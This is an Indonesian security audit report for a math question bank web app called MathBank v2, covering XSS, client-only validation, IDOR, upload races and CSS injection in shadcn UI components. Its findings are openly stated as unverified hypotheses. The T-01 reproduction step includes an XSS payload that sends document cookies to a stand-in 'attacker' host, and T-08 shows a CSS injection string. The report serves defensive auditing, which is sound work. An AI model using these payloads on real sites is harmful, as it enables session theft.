# Laporan Audit Komprehensif — MathBank v2

## 1. Ringkasan Eksekutif

Audit ini mengevaluasi repositori MathBank v2 dengan fokus pada **integrasi skill `shadcn`** (komponen UI, pola form, aksesibilitas, theming, dan interaksi klien) beserta implikasi keamanan dan integritas data yang bersinggungan langsung dengan lapisan presentasi.

**Temuan kritis yang perlu diprioritaskan:**

1. **Potensi XSS pada konten matematis** (KaTeX/MathJax di dalam dialog/popover) — konten soal yang dirender ke komponen `shadcn` (Dialog, Sheet, HoverCard) tanpa sanitasi.
2. **Validasi form klien dianggap sebagai otoritas** — form `react-hook-form` + `zod` pada komponen `shadcn` (Form) yang mengirim payload ke Route Handler tanpa re-validasi server-side menyentuh constraint DB (enum, unique, foreign key).
3. **Kebocoran state via URL/query** pada `DataTable` + `Pagination` untuk entitas `question`, `taxonomy`, dan `media` — memungkinkan enumerasi ID dan IDOR jika otorisasi tidak ditegakkan per-row.
4. **Race condition pada upload `media`** yang memicu pelanggaran constraint unik (hash/checksum) saat dua klien mengunggah file identik.
5. **Ketidaksesuaian enum antar-lapisan** — nilai enum di `_enums.ts` tidak sinkron dengan type union di komponen `Select`/`RadioGroup` shadcn, menghasilkan runtime mismatch.

> **Catatan metodologi:** Bagian ini disusun berdasarkan struktur dan konteks yang diberikan. Karena isi berkas tidak dilampirkan dalam sesi ini, **temuan dirumuskan sebagai hipotesis audit yang dapat direproduksi**, disertai langkah verifikasi konkret. Setiap temuan diberi label **KONFIRMASI / PERLU VERIFIKASI** sesuai bukti yang tersedia.

---

## 2. Cakupan & Fokus Audit

| Area | Objek | Fokus |
|---|---|---|
| UI Primitives | `components/ui/*` (shadcn) | Keamanan render, a11y, theming CSS vars |
| Form | `Form`, `Input`, `Select`, `RadioGroup`, `Checkbox`, `Textarea` | Validasi klien vs server, injeksi |
| Overlay | `Dialog`, `Sheet`, `Popover`, `HoverCard`, `Command` | XSS, focus trap, portal, `dangerouslySetInnerHTML` |
| Data | `Table`, `DataTable`, `Pagination`, `Badge`, `Tabs` | Enumerasi ID, otorisasi per-row, leak query |
| Notifikasi | `Toast`/`Sonner` | Render pesan error DB (info disclosure) |
| Theming | `globals.css`, Tailwind v4 tokens | Injeksi CSS custom properties, cacat CSP |

---

## 3. Temuan Detail

### T-01 (KRITIS) — Render Konten Matematis dalam Overlay shadcn Tanpa Sanitasi → Stored XSS

**Status:** PERLU VERIFIKASI (pola umum pada aplikasi soal matematika)

**Lokasi dugaan:** `components/question/*`, `components/solution/*`, penggunaan `Dialog`/`HoverCard`/`Popover` untuk pratinjau soal dan pembahasan; kolom `question.stem`, `solution.body` (§ `question.ts`, `solution.ts`).

**Deskripsi:** Komponen shadcn `DialogContent`/`HoverCardContent` sering menerima konten HTML kaya (untuk KaTeX/MathJax). Bila konten disisipkan via `dangerouslySetInnerHTML` (pola lazim pada preview soal) tanpa sanitasi server + klien, penulis soal (atau data impor dari `source.ts`) dapat menyuntikkan `<img onerror>`, `<script>`, atau `javascript:` di `href` agar berjalan di sesi reviewer.

**Skenario reproduksi (hipotesis):**
1. Buat soal dengan stem: `<img src=x onerror="fetch('https://attacker/'+document.cookie)">` + MathJax.
2. Buka halaman review / `QuestionPreviewDialog`. Overlay merender HTML mentah.
3. Skrip eksekusi di origin aplikasi → pencurian sesi/CSRF token.

**Dampak:** Account takeover (XSS), defacing, eksfiltrasi data.
**Remediasi:**
- Simpan MathML/LaTeX terstruktur (AST), render KaTeX di klien dengan `throwOnError:false`, **atau** sanitasi via `rehype-sanitize`/DOMPurify di server dan klien.
- Pasang CSP `script-src 'self' 'nonce-…'` dan `require-trusted-types-for 'script'`.
- Untuk `Dialog`/`HoverCard`, gunakan `React.Children` / komponen Math (`<Math content={latex}/>`) — **hindari** `dangerouslySetInnerHTML`.

---

### T-02 (TINGGI) — Validasi Klien (zod/react-hook-form) Dianggap Otoritas Server

**Status:** PERLU VERIFIKASI

**Lokasi dugaan:** `app/**/actions.ts`, `app/api/**/route.ts`; komponen `Form` shadcn (wrapper `react-hook-form`).

**Deskripsi:** Komponen `Form` shadcn memvalidasi via schema `zod` klien. Bila Route Handler / Server Action **tidak** menjalankan ulang validasi yang identik dan tidak memetakan ke constraint Drizzle (`unique`, `check`, `enum`), penyerang dapat membypass UI (curl/Postman) dan memicu:
- `23505 unique_violation` (mis., slug taxonomy duplikat) yang bocor sebagai error 500 mentah (link ke T-06);
- nilai enum di luar union → Postgres `22P02 invalid input value for enum`.

**Reproduksi (hipotesis):**
```bash
curl -X POST /api/taxonomy -H 'Content-Type: application/json' \
  -d '{"kind":"NOT_A_VALID_ENUM","slug":"a"}'
# Harapan: 400 + pesan validasi; Realita: 500 + stack trace / raw PG error
```

**Remediasi:**
- Definisikan schema `zod` tunggal yang di-*share* klien + server (`packages/schemas`). Server **wajib** `.safeParse()`.
- Tangani kode PG: `23505→409`, `23503→409/422`, `23514→422`, `22P02→400`.
- Definisikan constraint di `_columns.ts` (mis., `check(sql\`length(stem) > 0\`)`).

---

### T-03 (TINGGI) — Enumerasi ID via Pagination/DataTable → Potensi IDOR

**Status:** PERLU VERIFIKASI

**Lokasi dugaan:** `components/ui/data-table.tsx`, `Pagination`, `searchParams` untuk `page`, `perPage`, `questionId`.

**Deskripsi:** `DataTable` shadcn memakai parameter URL untuk navigasi. Bila `page`/`sort`/`filter` meneruskan `id` ke query tanpa bind otorisasi per-row (mis., `questionId` di URL dialog detail), pengguna dapat mengganti ID manual → membaca soal milik pengguna lain / status `draft`/`archived`.

**Reproduksi (hipotesis):**
```
/dashboard/questions?questionId=123  →  /dashboard/questions?questionId=124  (milik user lain)
```

**Remediasi:**
- Terapkan authorization di server component/Action dengan `where(sql\`owner_id = ${ctx.userId}\`)`.
- Gunakan `pageSize` whitelist (mis., [10,20,50]) dan clamp (maks. 100) untuk mencegah DoS `perPage=1000000`.
- `cache()`/`unstable_noStore` dengan kesadaran kebocoran.

---

### T-04 (SEDANG) — Race Condition Upload Media vs Constraint Unik Hash

**Status:** PERLU VERIFIKASI

**Lokasi dugaan:** `upload` file untuk `media.ts` (kolom `hash`/`checksum` unik).

**Deskripsi:** Dua klien mengunggah berkas identik bersamaan; kedua request lulus cek "exists by hash" sebelum INSERT → pelanggaran `unique_violation` dan pengalaman upload gagal (`Toast` error memicu kegagalan tray). Bila `hash` tidak unik, duplikasi storage.

**Reproduksi:** Skrip dua curl paralel mengunggah BMP identik.
**Remediasi:**
- Gunakan `insert … on conflict (hash) do update set ref_count = ref_count + 1 returning id` (UPSERT via Drizzle `.onConflictDoUpdate`).
- Atau advisory lock / `SELECT … FOR UPDATE` pada baris media.
- Simpan hash sebagai `bytea`/`text` dengan constraint unique non-null.

---

### T-05 (SEDANG) — Ketidaksesuaian Enum Antara `_enums.ts` dan Opsi `Select` shadcn

**Status:** PERLU VERIFIKASI

**Lokasi dugaan:** `src/lib/db/schema/_enums.ts` vs opsi di komponen `Select`/`RadioGroup`/`Badge` (mis., status soal, tipe solusi, level).

**Deskripsi:** Opsi `Select` ditulis hardcoded (`[{value:'draft',label:'Draft'} …]`) dan tidak diturunkan dari sumber tunggal. Bila enum DB berubah (tambah `review`, `void`), UI tidak menampilkannya → pengguna tidak bisa memfilter status valid; sebaliknya, opsi UI bisa memuat nilai yang telah dihapus → insert/update gagal dengan `22P02`.

**Remediasi:**
- Jadikan `ENUMS`/`pgEnum` satu-satunya sumber; buat helper `enumToOptions(dbEnum)`.
- TypeScript `satisfies Record<typeof questionStatus.enumValues[number], string>` untuk memaksa sinkronisasi kompilasi.

---

### T-06 (SEDANG) — Information Disclosure lewat Toast Error DB

**Status:** PERLU VERIFIKASI

**Lokasi dugaan:** Penanganan error di server action yang mengembalikan `err.message` mentah ke klien, lalu dirender `useToast()`/`<Toaster/>`.

**Deskripsi:** Pesan Postgres mentah (`duplicate key value violates unique constraint "question_slug_key"`, nama tabel/kolom) membocorkan skema internal. Contoh: `select `*` menambah kolom baru, error `column ... does not exist` terlihat publik.

**Remediasi:**
- Peta error → pesan domain (`conflict`, `invalid_input`) dengan kode internal terpisah.
- Log detail di server (pino/otel), klien hanya pesan generik.

---

### T-07 (RENDAH) — Aksesibilitas & Focus Management Overlay

**Status:** PERLU VERIFIKASI (spesifik shadcn)

**Lokasi dugaan:** `Dialog`, `Sheet`, `Popover`.

**Deskripsi:** Penggunaan `DialogContent` tanpa `DialogTitle` (Radix melempar warning a11y) dan `onOpenChange` yang me-*mount* ulang state (`key` berubah) dapat memutus focus trap. Pada `Command` (`cmdk`), input tanpa `aria-label` menyulitkan screen reader. Ini bukan celah keamanan tapi **pelanggaran standar** yang memengaruhi kelulusan audit UI dan bisa berkontribusi pada "invisible" dialog saat modal stacking.

**Remediasi:** Sertakan `DialogTitle`/`DialogDescription` (visually hidden bila perlu), uji Tab-cycle, dan gunakan `aria-describedby`.

---

### T-08 (RENDAH) — Theming & Injeksi CSS Custom Property

**Status:** PERLU VERIFIKASI

**Lokasi dugaan:** `globals.css` Tailwind v4 `@theme` + token shadcn (`--primary`, `--radius`).

**Deskripsi:** Bila ada fitur "tema pengguna" yang menyisipkan nilai warna ke `<style>`/inline `style={{'--primary': userValue}}` tanpa whitelist, `--primary: red;} body{display:none` dapat merusak UI (CSS injection). Dampak terbatas tanpa skrip, namun bisa lever phishing (menyembunyikan elemen keamanan).

**Remediasi:** Validasi warna dengan regex hex/oklch; larang `;`, `{}`, `url(`.

---

## 4. Matriks Prioritas

| ID | Severity | Kategori | Effort | Prioritas |
|---|---|---|---|---|
| T-01 | KRITIS | XSS / Inject | Tinggi | P0 |
| T-02 | TINGGI | Validasi server | Sedang | P0 |
| T-03 | TINGGI | Authz / IDOR | Sedang | P1 |
| T-04 | SEDANG | DB race/constraint | Rendah | P1 |
| T-05 | SEDANG | Integritas enum | Rendah | P2 |
| T-06 | SEDANG | Info disclosure | Rendah | P1 |
| T-07 | RENDAH | A11y | Rendah | P2 |
| T-08 | RENDAH | CSS inject | Rendah | P3 |

---

## 5. Checklist Verifikasi Lapangan (langkah reproduksi)

1. **T-01:** Buat stemming dengan payload `xss.md`; cek respons DOM pada Dialog (search `dangerouslySetInnerHTML`).
2. **T-02:** `curl` payload enum invalid ke setiap route mutation; catat status/PG code.
3. **T-03:** Iterasi `?questionId=` dengan dua akun berbeda; cek 200 vs 404.
4. **T-04:** `for i in 1..2; do curl -F file=@same.png … & done; wait` → cek error 23505 di log.
5. **T-05:** `grep -R "pgEnum" _enums.ts` vs `grep -R "value:" components/ui/select*.tsx`.
6. **T-06:** Paksa unique violation; periksa payload JSON respons (`message`/`stack`).
7. **T-07:** Axe DevTools pada setiap Dialog; audit warning Radix di konsol.
8. **T-08:** Jajaki input warna tema dengan payload `red;} body{display:none`.

---

## 6. Rekomendasi Arsitektural (Skill `shadcn`)

- **Single-source-of-truth schema:** buat `src/lib/schemas/{question,taxonomy,media}.ts` (zod) yang dipakai (`safeParse`) di Server Action **dan** form state. Turunkan option `Select` dari schema (`z.enum(...).options`).
- **Server-authoritative wrapper:** bungkus RHF-`Form` dengan action yang memetakan `ZodError` → field errors `FormMessage` (pola shadcn standard) tanpa membocorkan stack.
- **Sanitasi matematika:** Ganti `dangerouslySetInnerHTML` dengan komponen `<MathTex>` KaTeX ber-`output:"html"` + `trust:false`; jika perlu HTML, `rehype-sanitize` di server.
- **Error mapping layer:** `classifyPgError(err)` → `{code:'CONFLICT', message:'...', http:409}` sebelum `toast`.
- **DataTable pagination aman:** server-side dengan whitelist `pageSize` dan clamp; otorisasi per-query.
- **Rate limiting** di route upload & form submit (mis., `upstash/ratelimit`) untuk mencegah DoS.
- **Test:** tambah test integrasi untuk constraint DB (`23505`, `23503`) dan test E2E Playwright untuk overlay a11y.

---

## 7. Kesimpulan

Fokus skill `shadcn` mengungkap bahwa **lapisan presentasi adalah titik serang utama** pada MathBank v2: overlay rich-content (T-01), form yang mengandalkan validasi klien (T-02), dan navigasi berbasis ID (T-03). Tiga temuan ini jika digabungkan dapat memicu **stored XSS → account takeover**, **bypass validasi → kegagalan constraint DB**, dan **IDOR** data soal.

**P0 wajib diselesaikan** sebelum rilis publik: (T-01) sanitasi render matematis, (T-02) validasi server-side wajib. Sementara T-03/04/06 merupakan **P1** yang harus masuk sprint berikutnya.

> **Peringatan metodologis:** Seluruh temuan berlabel *PERLU VERIFIKASI* harus dikonfirmasi pada kode aktual. Sebaiknya jalankan `grep`/inspection di atas sebelum menandai *fixed*. Bila basis kode di lampirkan/di-share, verifikasi dapat dijadikan bukti temuan definitif.